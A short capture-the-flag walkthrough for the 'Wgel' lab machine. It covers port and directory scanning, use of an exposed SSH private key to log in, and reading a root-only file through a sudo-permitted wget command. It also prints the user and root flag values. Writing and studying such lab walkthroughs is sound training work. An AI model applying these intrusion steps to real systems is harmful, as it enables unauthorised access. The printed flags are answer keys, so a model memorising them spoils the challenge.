# Wgel CTF - Easy

<details>
<summary>nmap scan</summary>

```nmap -T4 -p- -A 10.10.213.126```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
ssh-hostkey:
    2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
    256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
    256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    http-title: Apache2 Ubuntu Default Page: It works
    http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</details>

<br>

* ffuf scan: ```ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.213.126/FUZZ```

* This gives us a directory named /sitemap

* We can use ffuf on the sitemap website as well. This will give us directories like /css, /js, /fonts amd /.ssh

* Furthermore, the default page for <http://10.10.213.126>, a Apache2 page, contains the following comment:

```markdown
<!-- Jessie don't forget to udate the webiste -->
```

* The /.ssh directory contains a id_rsa file (private key)

* We can also go for SSH username enumeration with the help of Metasploit. The module that we would be using is auxiliary/scanner/ssh/ssh_enumusers

* This gives us a list of users we can check. We can use 'jessie' as an user as well, assuming from the previous clue in comments.

* We save the RSA private key found in a id_rsa file in our directory and SSH the machine to check if jessie can login using that password.

```shell
chmod 600 id_rsa

ssh jessie@10.10.213.126 -i id_rsa
```

* The SSH login worked and we are logged in as Jessie

* User flag: ```057c67131c3d5e42dd5cd3075b198ff6```

* Now we have to find a way to escalate our privileges

* ```sudo -l``` shows us that we can run /usr/bin/wget as root

* By checking exploits available for wget on GTFObins, we can use a file read command to get the root flag.

```shell
LFILE=/root/root_flag.txt

sudo wget -i $LFILE
```

* This gives us the root flag: ```b1b968b37519ad1daa6408188649263d```
